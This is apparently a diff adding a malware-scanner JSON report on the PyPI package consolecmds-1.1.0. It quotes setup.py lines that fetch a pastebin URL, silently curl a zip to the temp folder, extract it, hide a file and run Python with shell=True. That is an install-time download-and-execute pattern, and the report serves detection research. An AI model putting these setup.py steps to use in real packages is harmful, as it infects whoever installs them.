@@ -1,0 +1,45 @@
+{
+    "issues": 5,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": [
+            {
+                "location": "consolecmds/setup.py:41",
+                "code": "\t\tcdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": [
+            {
+                "location": "consolecmds/setup.py:60",
+                "code": "        os.system(f\"attrib +h {file_path}\" )\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "consolecmds/setup.py:68",
+                "code": "\tp = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "consolecmds/setup.py:94",
+                "code": "\tos.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "consolecmds/setup.py:95",
+                "code": "\tos.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/consolecmds-1.1.0"
+}
